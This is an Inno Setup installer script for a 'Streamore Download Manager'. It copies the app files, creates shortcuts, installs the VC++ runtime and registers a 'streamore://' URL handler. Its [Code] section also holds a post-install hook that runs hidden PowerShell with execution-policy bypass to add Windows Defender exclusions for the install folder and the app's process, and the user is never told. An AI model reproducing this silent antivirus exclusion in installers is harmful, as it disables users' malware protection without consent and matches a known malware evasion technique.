; Streamore Download Manager - Inno Setup Installer
; Requires Inno Setup 6+ (https://jrsoftware.org/isinfo.php)

#define AppName "Streamore Download Manager"
#ifndef AppVersion
#define AppVersion "1.0.0"
#endif
#define AppPublisher "YoungLotusHuncho"
#define AppURL "https://streamore-five.vercel.app"
#define AppExeName "StreamoreManager.exe"

[Setup]
; Keep AppId stable so silent updates replace the same installed app.
AppId={{B46B0F1C-0E8B-4E36-8E4A-4B1C8A0C7D2F}
AppName={#AppName}
AppVersion={#AppVersion}
AppVerName={#AppName} {#AppVersion}
AppPublisher={#AppPublisher}
AppPublisherURL={#AppURL}
AppSupportURL={#AppURL}
DefaultDirName={autopf}\Streamore
DefaultGroupName=Streamore
AllowNoIcons=yes
PrivilegesRequired=admin
OutputDir=..\dist
OutputBaseFilename=StreamoreSetup
Compression=lzma2/ultra64
SolidCompression=yes
WizardStyle=modern
UsePreviousAppDir=yes

[Languages]
Name: "english"; MessagesFile: "compiler:Default.isl"

[Tasks]
Name: "desktopicon"; Description: "{cm:CreateDesktopIcon}"; GroupDescription: "{cm:AdditionalIcons}"; Flags: unchecked

[Files]
Source: "..\dist\StreamoreManager\*"; DestDir: "{app}"; Flags: recursesubdirs createallsubdirs ignoreversion
Source: "VC_redist.x64.exe"; DestDir: "{tmp}"; Flags: deleteafterinstall

[Icons]
Name: "{group}\{#AppName}"; Filename: "{app}\{#AppExeName}"
Name: "{commondesktop}\{#AppName}"; Filename: "{app}\{#AppExeName}"; Tasks: desktopicon

[Registry]
Root: HKCR; Subkey: "streamore"; ValueType: string; ValueData: "URL:Streamore Protocol"; Flags: uninsdeletekey
Root: HKCR; Subkey: "streamore"; ValueName: "URL Protocol"; ValueType: string; ValueData: ""; Flags: uninsdeletekey
Root: HKCR; Subkey: "streamore\shell\open\command"; ValueType: string; ValueData: """{app}\{#AppExeName}"" ""%1"""; Flags: uninsdeletekey

[Run]
Filename: "{tmp}\VC_redist.x64.exe"; Parameters: "/install /passive /norestart"; Check: VCRedistNeedsInstall; StatusMsg: "Installing Visual C++ Redistributable (2015-2022)..."
Filename: "{app}\{#AppExeName}"; Description: "{cm:LaunchProgram,{#StringChange(AppName, '&', '&&')}}"; Flags: nowait postinstall skipifsilent

[UninstallDelete]
Type: filesandordirs; Name: "{app}\_internal"

[Code]
function VCRedistNeedsInstall(): Boolean;
var
  Installed: Cardinal;
begin
  if RegQueryDWordValue(HKEY_LOCAL_MACHINE, 'SOFTWARE\Microsoft\VisualStudio\14.0\VC\Runtimes\x64', 'Installed', Installed) then
  begin
    Result := (Installed = 0);
  end
  else
  begin
    Result := True;
  end;
end;

procedure AddDefenderExclusion(FolderPath: String);
var
  ResultCode: Integer;
begin
  Exec('powershell.exe', '-WindowStyle Hidden -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath ''' + FolderPath + '''; Add-MpPreference -ExclusionProcess ''' + '{#AppExeName}' + '''"', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
end;

procedure CurStepChanged(CurStep: TSetupStep);
begin
  if CurStep = ssPostInstall then
  begin
    AddDefenderExclusion(ExpandConstant('{app}'));
  end;
end;

function InitializeSetup(): Boolean;
begin
  Result := True;
end;
